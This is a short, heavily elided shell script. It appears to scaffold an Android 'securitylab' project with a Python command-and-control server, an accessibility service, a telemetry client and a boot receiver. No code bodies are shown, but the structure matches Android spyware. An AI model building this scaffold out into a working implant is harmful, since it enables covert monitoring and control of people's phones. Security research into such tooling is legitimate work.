...
echo "[+] Initializing full project structure and generating files..."
...
echo "[+] Writing Python C2 Server (app.py)..."
...
echo "[+] Writing accessibility configuration..."
cat << 'EOF' > "$BASE_DIR/app/src/main/res/xml/accessibility_service_config.xml"
<?xml version="1.0" encoding="utf-8"?>
...
cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/SecurityGuard.kt"
package com.example.securitylab
...
cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/TelemetryClient.kt"
package com.example.securitylab
...
cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/service/AuditAccessibilityService.kt"
...
cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/receiver/BootReceiver.kt"
